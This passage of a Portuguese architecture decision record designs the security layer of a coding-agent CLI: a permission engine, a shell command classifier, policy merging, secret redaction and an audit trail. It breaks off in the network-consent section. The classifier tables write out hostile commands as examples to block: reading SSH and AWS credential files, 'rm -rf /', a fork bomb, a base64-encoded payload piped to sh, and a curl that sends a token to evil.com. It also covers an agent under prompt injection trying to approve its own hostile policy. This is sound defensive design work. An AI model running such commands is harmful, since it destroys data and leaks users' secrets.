# ADR 0003 — Fase 2 (Segurança e permissões): motor de permissão de 5 níveis, command classifier, policy engine, redaction pipeline e audit trail

- **Status:** Proposto (pendente do checkpoint do usuário no Gate 4 — protocolo de gate, passo 5)
- **Data:** 2026-08-05
- **Gate:** 4 (Arquitetura, design defensivo e SLOs) — FULL
- **Demanda:** `Fase 2 — Segurança e permissões` (`plano_desenvolvimento.md` §8), branch
  `feature/fase2-seguranca-e-permissoes` (de `develop`)
- **Autor (papel):** software-architect (com delegação a `security-engineer` — mecanismo do classifier +
  elegibilidade `--yes` — e `backend-engineer` — packaging + contratos, via Task tool)
- **Decisores:** usuário (sign-off do Gate 4)
- **Supersessão:** ADRs são imutáveis; mudanças a esta decisão criam um ADR sucessor, não editam este
  (The Practice of Architecting — Complete Professional Guide §2.8). Este ADR **não edita** os ADRs 0001/0002 —
  ele os **aplica**: o grafo de pacotes (0002 §3.1), a regra de dependência e os protected-paths já promovidos
  são insumos, citados por número onde usados.
- **Insumo herdado:**
  - **ADR 0002** (`docs/adr/0002-fase1-cli-foundation.md`) — 4 pacotes (`conductor-runtime`,
    `conductor-config`, `conductor-project`, `conductor-cli`), grafo de dependência (§3.1: os três de baixo
    **não** dependem uns dos outros), `packages/policies` **previsto** para a Fase 2 (§3.3), e o
    `ConductorSessionStore` **adiado** para a Fase 4 (§6). Este ADR fecha o "onde mora o motor de política"
    que 0002 §3.3 deixou nomeado.
  - **Gate 3 addendum Fase 2** (`docs/conductor/gate3-addendum-fase2.md`) — 11 ameaças novas (T17–T27), as
    **10 regras vinculantes R1–R10** (§4) que esta arquitetura DEVE respeitar, e as **6 lacunas GAP-A…F**
    (§5) devolvidas ao Gate 2 que esta arquitetura resolve estruturalmente.
  - **Gate 2 spec Fase 2** (`docs/conductor/gate2-spec-fase2.md`) — 24 FR (grupos A–G), 12 BR, 13 edge cases.
- **Insumo concorrente (Gate 3 ↔ Gate 4 iterativos, CLAUDE.md Gate 4):** §13 abaixo reconcilia ponto a ponto
  com o addendum do Gate 3 e **reporta de volta a ele** as duas fronteiras de confiança novas que esta
  arquitetura expõe (o `PolicyTrustStore` e a costura de redação no write-path), conforme o protocolo exige.

---

## 1. Contexto

### 1.1 O que a Fase 1 já entregou (código lido nesta sessão, não assumido)

O chokepoint existe e é real: `permission-gate.ts` (`pi.on("tool_call")`) com `decideToolCall` cobrindo
`read`/`write`/`edit`/`bash`/`conductor_note` e um **default-deny terminal** (`no policy declared for tool
"…" — fail closed`). Os primitivos que esta fase **reusa, não reescreve**:

- `workspace-policy.ts` — `evaluateToolPath`/`resolveRealPath`/`isWithinRoot`, canonicalização real-path +
  protected-paths; `defaultProtectedPaths(workspaceRoot)` já inclui `.conductor/config.json` e
  `.conductor/policy.json` (T13, por antecipação).
- `fail-closed.ts` — `evaluatePolicyFailClosed` (a regra-mãe: exceção → DENY).
- `confirm.ts` — `confirmOrDeny`, timeout com DENY explícito, sink único que sanitiza (T14).
- `secret-detection.ts` (em `conductor-config`) — `matchesKnownSecretPrefix`/`looksHighEntropy`/
  `looksSecretShaped`/`assertNoRawSecrets`, hoje **lançam** ao detectar segredo em `config.json`.
- `permission-gate.ts` `onDecision` — hoje um hook **em memória**, best-effort, servindo só a status-line.

### 1.2 O achado dominante que esta arquitetura tem que resolver (T23 — não opcional)

Verificado no código, não hipotético: `permission-gate.ts` chama `evaluateToolPath` **apenas** nos branches
`read`/`write`/`edit` (linhas 76–95). O branch `bash` (97–102) faz **só** `confirmOrDeny` — o comentário do
próprio código admite. Consequência: `bash("cat ~/.ssh/id_rsa")`, `bash("rm .conductor/policy.json")`,
`bash("> .conductor/audit.jsonl")` **nunca** passam pela checagem de protected-path. As garantias FR-9/FR-17/
BR-4 são **estruturalmente ilusórias para `bash`**.

**Fato dominante herdado (inalterado):** um **único processo de SO, sem sandbox**, com o privilégio do usuário
(`gate3-threat-model.md` §1; ADR 0001 R2). Não existe camada que impeça `bash` de alcançar qualquer path que o
processo alcança. Portanto a resposta é honesta em duas partes (R7): (i) o produto **não afirma** que
config/policy/audit são *hard-protected* enquanto `bash` estiver habilitado — para `bash` a garantia **degrada**
de hard-block para "classificação + aprovação/deny"; (ii) o **Command Classifier** é o controle que fecha o gap,
classificando `critical` (negado) todo `bash` cujo alvo de escrita/remoção detectável resolva para protected-path
ou fora do workspace. *Grounding:* **Secure and Reliable Systems Design §3.3/§3.13** ("expose narrow
purpose-built APIs instead of ambient root" — `bash` é *ambient authority* por natureza, logo o controle mora na
classificação da instância, não na tool; top 0.695 nesta linha, via subagente security-engineer). É uma garantia
de **grau-classificação, não grau-sandbox** — e o ADR carrega essa frase por escrito (R7).

### 1.3 Atributos de qualidade priorizados para esta decisão

Nesta ordem, porque esta fase é a fase de segurança e cada tensão abaixo é resolvida a favor do item mais alto:

1. **Fail-closed / não-regressão de segurança** — nenhuma garantia da Fase 0/1 pode enfraquecer; toda incerteza
   nega (Security Engineering Principles §2.9, "errors/uncertainty deny access").
2. **Não-over-claim (honestidade da garantia)** — a arquitetura não pode afirmar proteção que o modelo
   sem-sandbox não entrega (R7). Uma garantia falsa é pior que uma garantia menor declarada.
3. **Usabilidade da gate (sensitivity point)** — se a classificação for tão conservadora que todo comando vira
   `high`, o usuário liga `--yes` em tudo e o resultado de segurança **piora** (SE Principles §2.2). Este é o
   *sensitivity point* explícito do §10 (SLO).
4. **Testabilidade / regra de dependência** — a decisão (PDP) tem que ser unit-testável sem `ctx`/UI/disco;
   o I/O fica nas bordas (Architecture Boundaries §3.3/§3.4).
5. **Proporcionalidade de packaging** — não criar pacote por reflexo (ADR 0002 §2 item 3).

---

## 2. Decisão estrutural central — separar decisão de aplicação (PDP/PEP)

**Decisão:** dividir o que hoje é `decideToolCall` (que mistura decisão + I/O de UI) em duas peças com a regra de
dependência apontando para dentro:

- **Permission Engine (PDP — Policy Decision Point)** — `conductor-runtime/src/permission-engine.ts` (novo),
  função **pura**: recebe `(toolName, input, EffectivePolicy, workspace, yesFlagActive)` e a classificação do
  comando, devolve `EngineOutcome = allow | deny | needs-approval`. **Sem** `ctx`, **sem** UI, **sem** disco.
- **Permission Gate (PEP — Policy Enforcement Point)** — `permission-gate.ts` (existente, agora fino): o hook
  `pi.on("tool_call")`. Chama o Engine; se `needs-approval`, chama `confirmOrDeny` (código existente,
  inalterado); monta o `AuditEntry` e chama `appendAuditEntry` **dentro** do envelope `evaluatePolicyFailClosed`
  que já existe; devolve a decisão a Pi.

*Grounding:* **Architecture Boundaries and the Dependency Rule §2.3/§3.3/§3.4** ("ports deixam testar o core
isolado, em alta velocidade"; "policy no meio, I/O nas bordas" — top 0.592/0.620, confirmado pelos dois
subagentes). O split PDP/PEP é o análogo de segurança exato desse framing: o PDP é a política (o meio, sem I/O);
o PEP é o adapter (a borda, `ctx.ui.confirm()`). O ganho concreto: a matriz de decisão de 5 níveis × tiers ×
`--yes` fica testável sem um duplo de `ctx` — o mesmo ganho que o livro descreve para ports/adapters.

**Guardião de R10/T27 (regressão obrigatória):** a resolução de nível é ela própria fail-closed —
`resolvePermissionLevel(toolName)` mapeia uma tool sem nível explícito para `security` (máximo escrutínio), e o
`return { block: true, "no policy declared" }` terminal (FR-22) **sobrevive ao refactor como o último branch
literal**. Nenhuma tool ganha nível permissivo por omissão.

---

## 3. Command Classifier — a decisão-crux desta fase (mecanismo, tiers, extração de alvo)

Esta é a decisão que o Gate 3 nomeou como "fundamentalmente mais difícil que classificar `write(path)`" e a que
mais pede ADR. Delegada ao `security-engineer` e travada abaixo.

### 3.1 Mecanismo escolhido, com trade-off explícito

**Decisão: heurística léxica fail-closed (opção B) como espinha, com um allowlist de padrões conhecidos-seguros
(opção C) como a ÚNICA força de rebaixamento. Parse-AST de shell (opção A) é rejeitado como mecanismo primário.**

Em uma frase: *o tier é `max` sobre um conjunto de sinais léxicos que só sobem; o único caminho para `low`/
`medium` é casar um padrão explicitamente conhecido-seguro; tudo que não é provado seguro pisa em `high`; o que
não é analisável é `critical`.*

| Opção | Por que **não** foi escolhida como primária |
|---|---|
| **(A) Parse-AST (tree-sitter-bash)** | **Rejeitada.** (1) *Diferencial de parser* — tree-sitter é um parser com recuperação de erro que produz árvore best-effort; o sink real é `/bin/sh`/`bash`, cuja gramática (POSIX + bashisms + `IFS`/`set`/locale) não é idêntica. Toda divergência entre "a árvore que vejo" e "o que o shell executa" é um exploit. (2) *Não resolve o decode* — em `echo <blob> | base64 -d | sh`, o AST vê `echo|base64|sh` mas o `rm -rf` está dentro de um literal; a árvore não decodifica-e-entende (mesmo limite estrutural do prompt injection, T5). Ou seja, o AST classifica pela **estrutura** (`|sh` presente → high), que é o que B/C já fazem mais barato e mais conservador. (3) *Custo/superfície* — dependência nativa/WASM (supply-chain, Gate 7) e um fail-closed desajeitado para nós `ERROR`. **O AST entrega precisão onde a postura de segurança quer conservadorismo; precisão aqui é passivo** — tenta o classificador a "entender e liberar". |
| **(C) puro (tudo fora do allowlist = high)** | **Insuficiente sozinha.** É o default mais seguro (allowlist-sobre-denylist puro), mas grosseiro: se *todo* comando rotineiro fora da whitelist exige aprovação, a gate vira fricção → usuário liga `--yes` em tudo → segurança **pior** (SE Principles §2.2). Não ordena *entre* os perigosos (não distingue high/critical), não extrai alvo, não trata `curl|sh`. Precisa da camada de sinais de (B). |

**Por que (B)+(C) é defensável:** o modo de falha de (B) é **falso-positivo** (pede aprovação à toa), **nunca
falso-negativo-que-executa** — um regex que super-casa `| sh` (e pega também `| shellcheck`) erra para `high`,
erro seguro. Essa assimetria *é* a propriedade de segurança inteira. O denylist de indireção **não** é o
anti-padrão "payload probing" (Penetration Testing §8.12: "the separation of code from data is never optional;
what is optional is *this method*") porque não é *só* denylist: o piso fail-closed (não reconhecido = high; não
analisável = critical) captura tudo que o denylist perde. *Grounding:* **Penetration Testing §8.4** (source→sink:
a string de comando é a *source*, o interpretador é o *sink*, e o guard "allowlist/sandbox" é o que a ofuscação
quebra — top 0.633); **Web Application Security §1.9** ("input is data, not code; allowlist; least-privilege" —
0.617); **Security Engineering Principles §2.2/§2.9** (fail-closed, safe-by-default). **Nota de cobertura
honesta (confirma Gate 3 §8):** a biblioteca **não tem capítulo dedicado** a classificação/tiering/ofuscação de
comando de shell (toda consulta mirando o eixo retornou material genérico de injection, top ≤ 0.633). A escolha
A/B/C é fundamentada nos **princípios** (source→sink, allowlist-sobre-denylist, fail-closed, least-privilege),
não num livro que ranqueia mecanismos de classificador — declarado, não forçado.

**Defesa-em-profundidade opcional:** um parse leve pode entrar depois como *corroborador que só sobe tier*
(achar sinks que o regex perdeu), **nunca** como o que autoriza um rebaixamento (R1). É aditivo, não o mecanismo.

### 3.2 Tabela de decisão de tier (`tier = max(sinais)`; allowlist só produz low/medium e só quando nenhum sinal de subida disparou)

| # | Sinal | Exemplo | Tier | Regra |
|---|---|---|---|---|
| 1 | **allowlisted** (comando inteiro, sem nenhum sinal 2–14) | `ls -la`, `git status/diff`, `pwd`, `grep -rn`, `echo <literal>`; grant de `policy.json` | **low** | FR-3, BR-8 |
| 2 | mutação local, alvo extraído e **provado dentro do workspace** | `> ./build/out`, `rm ./tmp/x`, `mv a b` (no ws) | **medium** | R8 |
| 3 | mutação, alvo **não extraível**, verbo não-destrutivo, sem indireção | `cp $SRC ./x`, `tee $F` | **high** (piso) | R1, GAP-D |
| 4 | **indireção-para-interpretador** (independe do verbo aparente) | `\|sh`/`\|bash`/`\|python`/`\|node`, `eval`, `$()`/crase→cmd, `curl\|sh`, `sh -c`, heredoc→shell, `xargs sh -c`, `find -exec sh -c` | **high** (piso) | **R1** |
| 5 | **decode→interpretador** (estrutura reconhecida) | `base64 -d\|sh`, `xxd -r\|sh`, `printf '\x..'\|sh`, `openssl enc -d\|bash` | **high** piso; **`critical` p/ literal opaco** (▼) | **R1**, T17 |
| 6 | **marcador de ofuscação/encoding** presente | blob base64, runs `\x`/`\0`, `IFS=` trick, brace-expansion→cmd, var-concat em posição de comando | raise (≥ **high**) | **R1**, T17 |
| 7 | **token de comando não reconhecido** (lexou, mas posição de comando não mapeia a verbo) | `$X -rf ~`, verbo desconhecido | **high** | R1 (fail-closed léxico) |
| 8 | alvo de escrita/remoção extraído resolve **para protected-path** (via `evaluateToolPath`) | `> .conductor/config.json`, `rm .conductor/policy.json`, `> ~/.ssh/…`, `> .conductor/audit.jsonl` | **critical** (deny) | **R7, R9**, T23/T25 |
| 9 | alvo extraído resolve **fora do workspace** | `> /etc/hosts`, `mv x /tmp/…` | **critical** (deny) | R7, T23 |
| 10 | **read** de protected-path (exfil de segredo) | `cat ~/.ssh/id_rsa`, `head ~/.aws/credentials` | **high** (piso) | R7, T23 (metade read) |
| 11 | **verbo destrutivo + alvo não-resolvível estaticamente** | `rm -rf $(…)`, `rm -rf $TARGET`, `dd of=$X` | **critical** (deny) | R1/BR-9 (pior caso) |
| 12 | **known-catastrophic** sem uso legítimo | `rm -rf /`, `rm -rf ~`, `:(){ :\|:& };:`, `mkfs`, `dd of=/dev/sd*` | **critical** (deny) | FR-2, BR-8 |
| 13 | **erro de classificação** (vazio, encoding inválido, falha interna) | — | **critical** (deny) | **BR-1/BR-9/FR-4** |
| 14 | **restrição de `policy.json`** que sobe o tier de um padrão | override `high` p/ `git push` | raise | R3/R4 |

**Walkthrough T17 (`echo cm0gLXJmIC8= | base64 -d | sh`, onde `rm -rf` NÃO aparece em texto):** o sinal 1
(allowlist para `echo <literal>`) **não vale** — o allowlist exige "comando inteiro sem nenhum sinal de subida",
e aqui disparam o sinal 5 (`base64 -d` alcançando pipe) + o sinal 4 (`| sh`) + o sinal 6 (blob base64).
`tier = max(low, high, high, high) = high` no piso R1. **Não** vira `critical` por BR-9, porque a *estrutura* é
analisável (o classificador reconhece "decode→interpretador"); o que é opaco é o *payload*, não a *estrutura*. É
a invariante direcional de R1: a ofuscação **subiu** o tier de um aparente `echo` (`low`) para `high`, sem nunca
tentar "entender e liberar" os bytes.

**Nota ▼ — hardening recomendado (consistente com R1):** para "decode de **literal opaco** alcançando
interpretador" (sinal 5), o default é **`critical` (auto-deny)**, não `high`. R1 fixa o *piso* em high (piso =
mínimo; subir é sempre permitido); mas R2 exige mostrar o comando cru ao humano — e num `echo <blob>|base64 -d|sh`
o humano *vê a verdade e ainda assim não consegue avaliá-la* (bytes opacos). Aprovação sobre o não-avaliável é
teatro de aprovação (primo do T14). Já `curl https://host/x | sh` fica em **high**, porque a URL *é* avaliável
("confio nesse host?"). Distinção principiada: **fetch→interpretador com destino visível = high; decode→
interpretador de literal opaco = critical por default.** Como é *subida* acima do piso, não viola R1.

### 3.3 Extração de alvo de escrita/remoção — fecha T23/GAP-D

**Decisão: o classifier PRECISA de noção de path, mas NÃO implementa lógica de path — ele CHAMA
`evaluateToolPath`/`resolveRealPath`/`isWithinRoot` existentes.** Uma só autoridade de path
(`workspace-policy.ts`), **dois chamadores**: o branch `write`/`edit` (existente) e o branch `bash` via o extrator
de alvo (novo). *Grounding:* **Secure Code Review §3.2** ("bugs cluster at trust boundaries") — uma *segunda*
implementação de checagem de path no classifier seria uma segunda chance de omitir a canonicalização real-path/
symlink, reintroduzindo o exato bypass que a Fase 0 fechou. É literalmente o que T23 disse que faltava (o branch
`bash` passar a chamar `evaluateToolPath`), via alvos extraídos.

**Mecanismo:** o extrator puxa os operandos de `>`, `>>`, `rm`, `mv`, `truncate`, `dd`, `tee`, `install`, `cp`
(e, na extensão honesta, `cat`/`less`/`head`/`tail` para o caso exfil, sinal 10). Para cada alvo
literal/trivialmente-resolvível, chama `evaluateToolPath(target, {workspaceRoot, additionalProtectedPaths})`:
protected → **critical** (sinal 8); fora do workspace → **critical** (sinal 9); dentro → **medium** (sinal 2) e
candidato à contenção provada.

**Assimetria honesta write/edit vs bash:** write/edit recebem **um** `path` limpo (extração trivial + checagem
sólida). bash recebe **texto livre** de onde os alvos têm que ser *extraídos primeiro* — e **a extração é a parte
falível**. A checagem (`evaluateToolPath`) é sólida nos dois; o *suprimento de alvo* é, no bash, best-effort.
**Todo o residual mora no passo de extração — e ele falha para cima (high/critical), nunca para low.**

**Residual quando o alvo NÃO é estaticamente detectável (degradação declarada):** `rm -rf $(echo …|base64 -d)`,
`rm -rf $TARGET` → o extrator não resolve um path concreto; **não pode fingir que resolveu**. Degrada por classe
de verbo: **destrutivo (`rm -rf`/`dd`/`mkfs`/`truncate`) + alvo opaco → `critical` (deny)**; **mutante
não-destrutivo (`cp`/`tee`/`>`) + alvo opaco → `high`**. Nunca `low`/`medium`. A garantia "sem falso-ALLOW" se
mantém: o residual é falso-positivo, não falso-negativo-que-executa.

**Escopo do claim (R7 — o ADR carrega esta frase por escrito):** isto NÃO torna protected-paths "hard-protected
contra bash". É classificação+deny **dentro do loop do agente**, não hard-block de kernel. Alvo ofuscado que
derrota a extração → `critical`/`high` (contido), mas um processo fora do loop, ou um encoding não modelado, é o
residual sem-sandbox. Dizer "bash não alcança mais protected-path" **violaria R7**.

---

## 4. Modo `--yes` — elegibilidade fail-closed (fecha T24, vetor #2 do usuário)

**Decisão: elegibilidade a `--yes` é ela própria uma obrigação de prova positiva, com default NÃO-elegível.**
Uma decisão `D` é `--yes`-elegível (i.e. `--yes` PODE suprimir o `confirm`) **se e somente se TODAS** valerem:

1. `D.baseDecision` é **ALLOW-com-aprovação** (`block === false`) — nunca DENY, auto-deny, ou "no policy". (BR-3/FR-20)
2. `level !== "security"`.
3. **não** (`level === "network"` e destino não-consentido).
4. `tier ≤ medium` (nunca `high`/`critical`). (R8, R1/T17)
5. **`provablyContained === true`** — o classifier **provou** contenção: **todo** alvo extraído é estaticamente
   resolvível **E** `evaluateToolPath = allowed`, **e** não há indireção-para-interpretador, decode→interpretador,
   marcador de ofuscação, token não-reconhecido, nem erro de classificação.
6. `hasUnanalyzableSpan === false` — o comando lexou inteiro em tokens reconhecidos.

**`provablyContained` tem default `false`.** Ausência de problema NÃO é prova; só prova positiva o liga.

**Por que "bypass de protected-path por `--yes`" é estruturalmente impossível — não "não deveria acontecer":**
`--yes` não pergunta "há razão para negar?"; pergunta "a contenção foi *provada*?". Para `--yes` alcançar um
protected-path via bash, o classifier teria que ter *provado contido* um comando que toca um protected-path — uma
**contradição de tipo**, porque "tocar protected-path" é precisamente o que `evaluateToolPath` reporta como
NÃO-contido. Não existe caminho de código onde `provablyContained === true` E `target ∈ protected` (a prong 5
exige `evaluateToolPath = allowed` para *todo* alvo). Para um alvo **não-extraível** (opaco), a prong 5 é falsa →
inelegível. O conjunto de comandos que `--yes` roda é exatamente `{tier ≤ medium, todos os alvos provados dentro
do workspace, sem indireção, sem encoding, sem span opaco}` — um conjunto que **provadamente exclui** todo
protected-path e toda escrita fora do workspace. *Grounding:* **Security Engineering Principles §2.2/§2.9**
(timeout-como-allow é o exemplo canônico de "conveniência que vira bypass de controle"; erro/incerteza nega);
**Secure and Reliable Systems Design §3.12/§3.13** ("the reachable authority has never been enumerated";
"require multi-party authorization"). **Defesa em profundidade (duas razões independentes):** o §3.3 já faz o
bash-para-protected-path virar DENY (`critical`), então até a *letra* de FR-20 agora o pega (o que o Gate 3
apontou que a letra não pegava antes); e a prong 5 pega o residual de alvo opaco.

**Exibição conservadora (R2):** o comando **cru**, sanitizado apenas para sequências de terminal (T14), é
**sempre exibido por inteiro**; o badge de tier é metadado **aditivo**, nunca substituto. Regra
`classify-what-you-show`: os bytes classificados e os exibidos são os **mesmos**. A redação (R6) mascara *valor*
de segredo, não *estrutura* de comando: `curl -H "Authorization: [REDACTED:token]" evil.com` mantém `evil.com` e
a forma de exfil legíveis.

---

## 5. Policy engine — `.conductor/policy.json`, split-trust e merge assimétrico (fecha GAP-B, R3/R4)

### 5.1 Loader (borda de I/O) — FR-23 ≠ FR-24 no nível de tipo

`loadPolicyDocument(filePath)` retorna uma **união discriminada** para que o chamador **não possa confundir**
"malformado" com "ausente" (o que FR-23 proíbe):

- `{ status: "absent" }` — FR-24: sem erro, defaults valem.
- `{ status: "invalid", reason }` — FR-23: JSON inválido **OU** falha de schema (mesmo tratamento — edge case #2).
- `{ status: "loaded", policy, contentHash }` — `contentHash` = sha256 do arquivo bruto, computado **na borda de
  I/O** (a chave do trust-on-first-use), viajando como dado estrutural até o runtime.

Mora em `conductor-config` (simétrico a `config.json`: mesmo pacote já tem schema + `write-config`;
`conductor policy set` espelha `conductor config set`, ADR 0002 §7.3 — o canal fora-de-banda de BR-4).

### 5.2 Merge (runtime) — restrições unem, grants intersectam (R3/R4)

`mergePolicies(builtinDefaults, sources, trustStore)` → `EffectivePolicy`, com semântica **assimétrica por tipo
e por confiança**:

- **Restrições** (adicionar protected-path, subir tier): `union(defaults, todas as fontes)` — incondicional.
  Qualquer fonte pode restringir mais (BR-5/FR-10). Seguro por construção.
- **Grants** (auto-aprovar por allowlist, consentir rede, descer tier): só valem para fonte **carregada E
  confiada** (trust-on-first-use por `contentHash`) **E** dentro de **tetos rígidos** — nunca auto-aprova
  `high`/`critical` (o schema limita `allowlist.risk` a `low|medium`), nunca remove protected-path default. Merge
  de grants é **interseção trust-ordered**: uma fonte `project` (vem no repo, atacante-alcançável) **nunca amplia
  além** de uma `user-global`. Nunca `grants = união`.
- **`denyAllPrivileged`** — se **qualquer** fonte for `invalid`, este flag liga: `read` segue normal, mas
  Write/Exec/Network/Security são negados na sessão inteira (FR-23/BR-1). Uma fonte ruim **não é derrotada em
  votação** por uma boa.

*Grounding:* **Secure and Reliable Systems Design §3.3/§3.12** ("a autoridade efetiva de um princípio é a
*interseção* dos limites, não a união"; "enumerar a autoridade alcançável antes de conceder"); a *forma de
trade-off* (união = usabilidade, interseção = least-privilege) segue **Distributed Architecture Decisions
§1.1/§1.5** ("trade-offs, not best practices" — top 0.572). **Regra-resumo: restrições unem; grants intersectam
(ordenados por confiança).**

### 5.3 Fronteira nova exposta — o `PolicyTrustStore` é ele próprio um store sensível (reportado ao Gate 3)

O ledger de trust-on-first-use (que hashes de `policy.json` o usuário aprovou fora-de-banda) é um **dado sensível
novo** — se um agente sob injeção puder gravá-lo, ele "aprova" a própria política hostil (T18 por outra porta).
Esta arquitetura o trata como **T26-like**: o ledger persiste dentro de `.conductor/`, é **protected-path**
(write/edit + bash-`critical`), **0600**, **gitignored**, local-first (NFR-5), e só é escrito pelo canal
fora-de-banda (`conductor policy trust`, simétrico a `config set`). O **mecanismo de persistência** do ledger é
Gate 6; a **fronteira de confiança** é reconciliada com o Gate 3 no §13.

---

## 6. Redaction Pipeline — conjunto FECHADO de sinks, redigir-antes-de-persistir (fecha GAP-C, GAP-E, R6)

**Decisão: os matchers de segredo saem de `conductor-config` para um pacote-folha novo `@conductor/secrets`
(zero dependências de outro `@conductor/*`), e a redação roda no limite mais externo de cada sink, antes da 1ª
escrita durável e antes de todo egress.**

### 6.1 A fronteira dos matchers (a decisão de dependência mais delicada)

`conductor-runtime` **não pode** depender de `conductor-config` (violaria o grafo do ADR 0002 §3.1), mas ambos
precisam dos mesmos matchers. Resolução: extrair os matchers **puros** (`matchesKnownSecretPrefix`,
`looksHighEntropy`, `looksSecretShaped`, `findSecretSpans`, `redactSecrets`) para `@conductor/secrets`. Este é o
**único** pacote novo desta fase, e é o único caso que passa no teste de proporcionalidade do ADR 0002 §2 item 3
("extrair sem um segundo chamador real é decompor antes da dor") — porque o **segundo chamador real existe**
(runtime precisa do que config já tem). *Grounding:* **Architecture Boundaries §1.1** ("dependências apontam para
dentro, para o detalhe volátil"; §1.12 "when not to invert" — aqui há dois consumidores reais, então a extração
é paga e gasta — top 0.614/0.620).

`conductor-config` (**assert+throw**) e `conductor-runtime` (**mask**) importam a **MESMA** `findSecretSpans` —
não compartilham por duplicação de regex, compartilham por importar a mesma função de um pacote-folha, e cada
consumidor decide sua **política de reação** (lançar vs. mascarar) sobre o mesmo resultado de detecção. Isso
garante que a redação **nunca diverge** do que o Secret Scanner considera secret-shaped (sem lista de padrões
para desalinhar) — fecha FR-14 (`\b` word-boundary já corrigido em Gate 8) e FR-15 (SHA/UUID não mascarado, via a
mesma distinção charset/entropia). `redactSecrets` em `conductor-runtime` tem **wrapper fail-closed**: se o
matcher lançar, devolve `[REDACTED: secret-scan failed — content withheld]`, nunca o texto original (BR-1
estendido à redação).

### 6.2 Conjunto FECHADO de 6 sinks (localizados no código, R6/GAP-C)

| # | Sink | Local (verificado) | Ponto da redação |
|---|---|---|---|
| 1 | Transcrito vivo / TUI (stdout) | `conductor-cli/.../chat/transcript.ts:71` (funil único; hoje só `sanitizeForTerminal`) | `redactSecrets` **antes** de `sanitizeForTerminal`, no mesmo funil (FR-13) |
| 2 | `ctx.ui.notify` → block reason | `tui-ui-context.ts:163-166` ← `permission-gate.ts:160` (`decision.reason`, texto do modelo) | redigir `reason` na construção da decisão, antes do notify (T21 item 5) |
| 3 | **Session JSONL** (persiste em disco) | `SessionManager` do Pi → `.conductor/sessions/*.jsonl` | costura de redação no **write-path**, antes do persist (T22/GAP-E — ver §6.3) |
| 4 | **Audit trail** | `audit-trail.ts` (novo) | redigido dentro de `appendAuditEntry` antes de serializar (FR-12) |
| 5 | Erro re-lançado / `reason` | `fail-closed.ts` embute a string ofensora no `reason` | redigir na fronteira onde `reason` vira sink (audit/notify) |
| 6 | `session export` futuro | não construído nesta fase | a garantia BR-7 vale quando ele for entregue |

**O output do classifier é uma FONTE nova (costura #2 do security-engineer):** `TierSignal.detail` e
`displayCommand` podem conter segredo inline (comando com token). São escritos no audit (FR-12), no notify e no
transcrito — **passam pela redação como qualquer outra fonte**; não são "internos, logo isentos". *Grounding:*
**OWASP ASVS V6.4/V7.1** (logs viram material classificado; segredo fora de logs) + **Secure Code Review §2.5**
(taint source→sink: redigir **em cada sink**) — herdados do Gate 3 §4 R6.

### 6.3 O sink #3 (session JSONL) e a reconciliação com ADR 0002 §6

Redigir-antes-de-persistir (R6/GAP-E, **direção vinculante**) exige uma costura de redação **entre** o conteúdo
de sessão e a escrita do JSONL — mas o `SessionManager` é do **Pi** (o Conductor não o possui), e ADR 0002 §6
adiou o `ConductorSessionStore` completo para a Fase 4. **Resolução:** a Fase 2 introduz uma **transformação de
redação fina no write-path** — um filtro de saída que redige tool-inputs/results antes de chegarem ao
`SessionManager` — **distinta** do `ConductorSessionStore` completo (que carrega o *schema de evidência*, e
continua Fase 4). O filtro não é o store; é um transform sem estado. Isso **não reabre** ADR 0002 §6 (o store de
evidência segue adiado) e satisfaz R6 (a direção segura é vinculante; só o *mecanismo* é escolha do Gate 4). O
**ponto de integração exato** com o `SessionManager` do Pi (expõe um write-hook? ou os entries têm que ser
redigidos no ponto de captura?) é um **residual de verificação do Gate 6** — mesma disciplina honesta que ADR
0002 §12 usou para o escaping de terminal do `Text` do Pi.

---

## 7. Audit Trail — append-only, fail-closed-write, protegido (fecha R9, T25/T26)

**Decisão: `audit-trail.ts` (novo, em `conductor-runtime`), append-only, com um segundo hook paralelo ao
`onDecision` existente.**

- **Dois hooks, não um.** `onDecision` (existente, em memória, best-effort, envolto em try/catch que descarta
  erro — "observability must never affect the security decision") fica **inalterado**, servindo só a status-line.
  `appendAuditEntry` é uma **nova chamada síncrona-que-lança**, dentro do envelope `evaluatePolicyFailClosed` que
  já envolve `decideToolCall`. Uma falha de escrita **propaga como exceção → `{block:true}` pela máquina que já
  existe** → a operação que seria auditada **nunca executa sem rastro** (FR-18). **Zero máquina de fail-closed
  nova.** Misturar os dois faria uma falha de persistência ser engolida (o que FR-18 proíbe).
- **Mecanismo:** `createAuditTrailWriter(filePath)` abre em `O_APPEND` (nunca truncate), modo `0o600`; uma linha
  JSON por entrada (JSONL, NFR-3, mesmo padrão das sessões); redige `reason`/`egress.destination` internamente
  antes de serializar (defesa em profundidade, sole-sink como confirm.ts/T14). **`.conductor/audit.jsonl` entra
  em `defaultProtectedPaths(workspaceRoot)`** ao lado de config/policy — fecha FR-17 para write/edit por
  construção; o fechamento para bash é do Command Classifier (bash visando `audit.jsonl` → `critical`, §3.2 sinal
  8). Gitignored (T26, como `sessions/`).
- **`AuditEntry` (FR-16):** timestamp ISO-8601 UTC, tool, toolCallId, permissionLevel, riskTier (só Exec),
  decision allow|deny, reason (já redigido), `yesFlagActive` (FR-21, distinto de `approvalMethod`),
  `approvalMethod: human|yes-flag|allowlist|none` (FR-21/BR-11), `egress` (só Network, FR-7).
- **Residual declarado (herdado):** integridade **criptográfica** (hash-chain/assinatura) é **Fase 4** (ADR 0002
  §6 / spec §3 Non-goal). O audit da Fase 2 é *append-only + protegido*, **não** tamper-evident por cripto — um
  atacante com acesso direto ao disco (fora do loop do agente) ainda pode editá-lo. Risco residual **aceito e
  declarado**, não garantia falsa. **Residual de verificação:** atomicidade de `O_APPEND` **no Windows**
  (ambiente de dev) — semântica POSIX padrão, **não coberta pela biblioteca** — precisa de teste explícito no
  Gate 6/8 antes de reivindicar NFR-2 nesse SO.

*Grounding:* **OWASP ASVS V7.1/V7.2** (logs de auditoria claros, protegidos, analisáveis); **Secure and Reliable
Systems Design §3.13** ("route privileged access through an audit trail" — o valor do audit *pressupõe* que o
auditado não o controla, o que justifica ser protected-path); **Managing Software Complexity §3.12** ("some
callers act differently on the error… defining that away deletes information" — top 0.558: **âncora direta do
fail-closed-write** — uma falha de escrita de auditoria **não pode** ser engolida como um `delete()` que absorve
`FileNotFound`; para um audit trail, entrada ausente = perda do registro de segurança). **Cobertura fraca honesta
(confirma o subagente):** o corpus **não** tem capítulo de atomicidade de `O_APPEND`/`write(2)` — reportado, não
forçado.

---

## 8. Network consent — default-deny, Egress Event pré-gravado (fecha GAP-F, R5)

**Decisão:** o nível `Network` é **default-deny** para todo destino exceto o **único endpoint de provedor de
modelo configurado** (Fase 0 T7, já consentido por config). Qualquer outro host (o ping opcional de `doctor` a um
